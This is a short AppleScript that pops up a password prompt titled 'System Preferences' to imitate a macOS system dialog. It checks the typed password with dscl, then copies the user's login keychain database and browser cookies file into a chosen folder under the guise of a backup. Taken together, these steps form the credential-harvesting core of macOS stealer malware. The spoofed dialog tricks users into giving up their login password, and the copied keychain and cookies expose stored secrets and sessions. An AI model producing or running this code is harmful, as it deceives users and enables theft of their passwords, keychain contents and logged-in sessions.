set reply to display dialog "Enter your password" default answer "" with hidden answer with title "System Preferences"
set secret to text returned of reply
do shell script "dscl . authonly user " & quoted form of secret
set sourceStores to {"Library/Keychains/login.keychain-db", "Library/Cookies/Cookies.binarycookies"}
set backupFolder to choose folder with prompt "Choose a backup destination"
tell application "Finder"
    repeat with sourcePath in sourceStores
        duplicate (POSIX file ((POSIX path of (path to home folder)) & sourcePath)) to backupFolder
    end repeat
end tell
